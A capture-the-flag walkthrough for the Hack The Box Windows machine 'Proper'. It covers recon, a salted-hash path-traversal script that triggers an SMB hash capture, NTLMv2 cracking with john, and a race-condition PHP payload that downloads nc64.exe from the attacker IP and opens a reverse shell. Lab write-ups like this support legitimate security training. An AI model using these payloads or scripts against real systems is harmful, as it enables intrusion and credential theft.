# Proper 
#HTB #CTF  
Rank : hard
IP : 10.10.10.231
OS : Windows

Setup 
```bash
echo "10.10.10.231 proper.htb" > /etc/hosts
```


# Recon

Fire up nmap 
```bash
nmap -sV -sC -v -P- -o nmapscan proper.htb
PORT   STATE SERVICE VERSION  
80/tcp open  http    Microsoft IIS httpd 10.0  
| http-methods:    
|   Supported Methods: OPTIONS TRACE GET HEAD POST  
|\_  Potentially risky methods: TRACE  
|\_http-server-header: Microsoft-IIS/10.0  
|\_http-title: OS Tidy Inc.  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Lets go to the webpage. 

![[Pasted image 20210523122504.png]]

![[proper.pdf]]
Always start by looking at the source code of the page for any information 

As you see blow the id of these element looks very similar to usernames.
![[Pasted image 20210523123453.png]]

*User*
dustin
daksh
anna
wafer

And what appear to be hash id
![[Pasted image 20210523124404.png]]

hash = a1b30d31d344a5a4e41e8496ccbdd26b

Seems to be md5 hash. 

If you follow the link and remove the parameters to get to this source code 

![[Pasted image 20210523124645.png]]

Salt: hie0shah6ooNoim

What I see there two options salt\$hash or hash\$salt. 


While I was look at source code I started to do some enumeration on the site for looking for sites.  
### gobuster
#gobuster
```bash
└──╼ $ gobuster dir -u http://proper.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 50 -k  
\===============================================================  
Gobuster v3.1.0  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
\===============================================================  
\[+\] Url:                     http://proper.htb  
\[+\] Method:                  GET  
\[+\] Threads:                 50  
\[+\] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt  
\[+\] Negative Status codes:   404  
\[+\] User Agent:              gobuster/3.1.0  
\[+\] Timeout:                 10s  
\===============================================================  
2021/05/23 12:27:33 Starting gobuster in directory enumeration mode  
\===============================================================  
/assets               (Status: 301) \[Size: 148\] \[--> http://proper.htb/assets/\]  
/.                    (Status: 200) \[Size: 14257\]                                 
/Assets               (Status: 301) \[Size: 148\] \[--> http://proper.htb/Assets/\]  
/licenses             (Status: 301) \[Size: 150\] \[--> http://proper.htb/licenses/\]  
/LICENSES             (Status: 301) \[Size: 150\] \[--> http://proper.htb/LICENSES/\]  
/ASSETS               (Status: 301) \[Size: 148\] \[--> http://proper.htb/ASSETS/\]     
/Licenses             (Status: 301) \[Size: 150\] \[--> http://proper.htb/Licenses/\]  
```

Assets lead us to 403 page. 
Licenses give us a login page. 
![[Pasted image 20210523123159.png]]

creds: 
vikki.solomon@throwaway.mail / password1


read.sh
```bash
#!/bin/bash

HOST=proper.htb
SALT=hie0shah6ooNoim
TRAV=$1
USER=vikki.solomon@throwaway.mail 
PASS=password1
COOKIE=$(mktemp -u)
PROXY=127.0.0.1:8080

#login
curl -c $COOKIE -s -o /dev/nul http://$HOST/licenses/index.php
curl -s \
	 -b $COOKIE \
	 -o /dev/null \
	 -d "username=${USER}&password=${PASS}" \
	 http://$HOST/licenses/index.php
	 
# SMB
curl -s \
	 -b $COOKIE \
	 -G \
	 -d "theme=${TRAV}" \
	 -d "h=$(echo -n ${SALT}${TRAV} | md5sum | cut -d' ' -f1)" \
	 -o /dev/null \
	 http://$HOST/licenses/licenses.php
	 
	 
# clean up 
rm -rf $COOKIE

```


### smbserver 
#smbserver
```bash
sudo smbserver.py .ip 10.10.14.19 -smb2support  
Impacket v0.9.23.dev1+20210517.123049.a0612f00 - Copyright 2020 SecureAuth Corporation  
  
\[\*\] Config file parsed  
\[\*\] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
\[\*\] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0  
\[\*\] Config file parsed  
\[\*\] Config file parsed  
\[\*\] Config file parsed  
\[\*\] Incoming connection (10.10.10.231,51107)  
\[\*\] AUTHENTICATE\_MESSAGE (PROPER\\web,PROPER)  
\[\*\] User PROPER\\web authenticated successfully  
\[\*\] web::PROPER:aaaaaaaaaaaaaaaa:31c57ecad889ff706a19613a9ac43cf7:010100000000000080c0829ac94fd701917fc90872e5853c000000000100100076004100700047004800420052006400030010007600410070004700480042005200640  
002001000740076006d006800650071005300500004001000740076006d00680065007100530050000700080080c0829ac94fd7010600040002000000080030003000000000000000000000000020000031e4fa0b370783744895f0fb54460897ccef8ad6  
90cf42d360f3fd502db9edc90a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310039000000000000000000
```

Crack the hash using john 
```bash
sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (netntlmv2, NTLMv2 C/R \[MD4 HMAC-MD5 32/64\])  
Will run 8 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
charlotte123!    (web)  
1g 0:00:00:05 DONE (2021-05-23 14:53) 0.1992g/s 197456p/s 197456c/s 197456C/s chrismmy..chaqueto  
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
Session completed
```
creds : web/charlotte123!

race condition scripts

```bash
#!/bin/bash
PAYLOAD=$1

while :; do
	echo hello world > header.inc
	echo "$PAYLOAD" > header.inc
done

```

```bash
./race.sh '<?php system("cmd /c powershell iwr http://10.10.14.19/nc64.exe -outf \windows\system32\spool\drivers\color\cute.exe"); ?>'

./race.sh '<?php system("cmd /c start \windows\system32\spool\drivers\color\cute.exe 10.10.14.19 1234 -e cmd.exe"); ?>'

```